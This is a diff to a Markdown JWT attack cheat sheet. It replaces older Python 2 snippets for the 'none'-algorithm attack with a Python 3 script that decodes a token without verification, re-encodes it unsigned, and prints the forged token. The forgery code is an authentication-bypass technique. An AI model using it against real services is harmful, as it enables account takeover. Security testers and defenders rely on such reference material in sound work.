@@ -100,37 +100,25 @@ To exploit this vulnerability, you just need to decode the JWT and change the al
 
 However, this won't work unless you **remove** the signature
 
-The following code is a basic test for a None algorithm.
-
-```python
-import jwt
-import base64
-
-def b64urlencode(data):
-    return base64.b64encode(data).replace('+', '-').replace('/', '_').replace('=', '')
-
-print b64urlencode("{\"typ\":\"JWT\",\"alg\":\"none\"}") + \
-    '.' + b64urlencode("{\"data\":\"test\"}") + '.'
-```
-
 Alternatively you can modify an existing JWT (be careful with the expiration time)
 
-```python
-#!/usr/bin/python
+```python3
+#!/usr/bin/python3
 # -*- coding: utf-8 -*-
 
-jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ"
-header, payload, signature  = jwt.split('.')
+import jwt
 
-# Replacing the ALGO and the payload username
-header  = header.decode('base64').replace('HS256',"none")
-payload = (payload+"==").decode('base64').replace('test','admin')
+jwtToken 	= 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ'
 
-header  = header.encode('base64').strip().replace("=","")
-payload = payload.encode('base64').strip().replace("=","")
+decodedToken 	= jwt.decode(jwtToken, verify=False)  					# Need to decode the token before encoding with type 'None'
+noneEncoded 	= jwt.encode(decodedToken, key='', algorithm=None)
 
-# 'The algorithm 'none' is not supported'
-print( header+"."+payload+".")
+print(noneEncoded.decode())
+
+"""
+Output:
+eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.
+"""
 ```
 
 ## JWT Signature - RS256 to HS256
